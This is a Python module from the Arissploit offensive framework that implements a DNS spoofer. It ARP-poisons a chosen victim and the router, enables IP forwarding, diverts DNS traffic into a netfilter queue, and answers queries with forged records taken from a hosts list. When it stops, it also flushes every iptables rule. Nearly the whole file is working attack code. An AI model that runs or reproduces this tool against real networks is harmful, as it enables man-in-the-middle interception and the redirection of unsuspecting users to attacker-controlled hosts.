#!/usr/bin/env python3

#            ---------------------------------------------------
#                           Arissploit Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core.arissploit import *
from core import colors
import os
from core import getpath
from scapy.all import *
import threading, queue
import time
import traceback

importerror = False
try:
	from netfilterqueue import NetfilterQueue
except:
	importerror = True
	terror = traceback.format_exc()
	printError("Cannot import netfilterqueue!")


conf = {
	"name": "dns_spoof",
	"version": "2.0",
	"shortdesc": "Network targets DNS spoofer.",
	"author": "Entynetproject",
	"initdate": "29.4.2019",
	"lastmod": "31.12.2019",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["libnetfilter-queue-dev", "python3.5-dev"]
}


# List of the variables
variables = OrderedDict((
	('target', ['192.168.1.2', 'Target IP address.']),
	('router', ['192.168.1.1', 'Router IP address.']),
	("arp_spoof", ["true", "Enable ARP spoof."])
))

# Additional notes to options
option_notes = colors.red+'Remember to edit hostlist:\n'+getpath.conf()+"hosts"+colors.end

customcommands = {
	'stop': 'Stop DNS spoof.'
}

#simple changelog
changelog = "Version 1.0:\nrelease\nVersion 2.0:\n rewritten"

class Controller:
	kill = False
	error = None

	def __init__(self):
		self.kill = False
		self.error = None

	def reset(self):
		self.kill = False
		self.error = None

class ArpSpoofer(threading.Thread):
	router = None
	victim = None
	controller = None

	def __init__(self, router, victim, controller):
		self.router = router
		self.victim = victim
		self.controller = controller
		threading.Thread.__init__(self)

	def originalMAC(self, ip):
		ans, unans = arping(ip, verbose=0)
		for s,r in ans:
			return r[Ether].src

	def poison(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

	def restore(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)

	def run(self):
		tried = 0
		routerMAC = self.originalMAC(self.router)
		victimMAC = self.originalMAC(self.victim)
		if routerMAC == None:
			printError("Could not find router MAC address!")
			if tried < 5:
				printInfo("Trying again...")
				tried =+ 1
				self.run()
			printInfo("Giving up...")
			self.controller.error = "[-] Could not find router MAC address!"
			self.controller.kill = True
		if victimMAC == None:
			printError("Could not find victim MAC address!")
			if tried < 5:
				printInfo("Trying again...")
				tried =+ 1
				self.run()
			printInfo("Giving up...")
			self.controller.error = "[-] Could not find victim MAC address!"
			self.controller.kill = True

		while 1:
			if self.controller.kill == True:
				self.restore(self.router, self.victim, routerMAC, victimMAC)
				os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
				printInform("ARP spoofing stopped.")
				return
			self.poison(self.router, self.victim, routerMAC, victimMAC)
			time.sleep(1.5)


def callback(packet):
	found = False
	payload = packet.get_payload()
	pkt = IP(payload)
	
	if not pkt.haslayer(DNSQR):
		packet.accept()
	else:
		for record in hostlist:
			if record[1] in pkt[DNS].qd.qname or record[1] == b'*':
				printInfo(pkt[DNS].qd.qname.decode()+" -> "+record[0].decode())
				found = True
				spoofed_pkt = bytes(IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
					UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
					DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
					an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=record[0])))

				packet.set_payload(spoofed_pkt)
				packet.accept()
				break
		if found == False:
			packet.accept()

controller = Controller()
hostlist = []

def run():
	if importerror == True:
		printError("Netfilterqueue is not imported!")
		print("Traceback:\n"+str(error))
		return

	controller.reset()
	printInfo("Loading host list...")
	try:
		hostfile = open(getpath.conf()+"hosts", "r").read()
	except FileNotFoundError:
		printError("Host list is not found!")
		return
	except PermissionError:
		printError("Permission denied!")
	for line in hostfile.splitlines():
		if "#" not in line and len(line.split()) == 2:
			hostlist.append(line.split())

	for item in hostlist:
		try:
			item[0] = item[0].encode()
		except AttributeError:
			pass
		try:
			item[1] = item[1].encode()
		except AttributeError:
			pass

	if variables["arp_spoof"][0] == "true":
		printInfo("IPv4 forwarding...")
		os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
		printInfo("Starting ARP spoof...")
		arpspoof = ArpSpoofer(variables["router"][0], variables["target"][0], controller)
		arpspoof.start()

	printInform("Ctrl-C to stop.")
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
	try:
		q = NetfilterQueue()
		q.bind(1, callback)
		try:
			q.run()
		except KeyboardInterrupt:
			controller.kill = True
			q.unbind()
			os.system('iptables -F')
			os.system('iptables -X')
			printInform("DNS spoof stopped.")
	except:
		printError("Unexcepted error:\n")
		traceback.print_exc(file=sys.stdout)
		controller.kill = True

	if variables["arp_spoof"][0] == "true":
		printInfo("Stopping ARP spoof...")
		arpspoof.join()
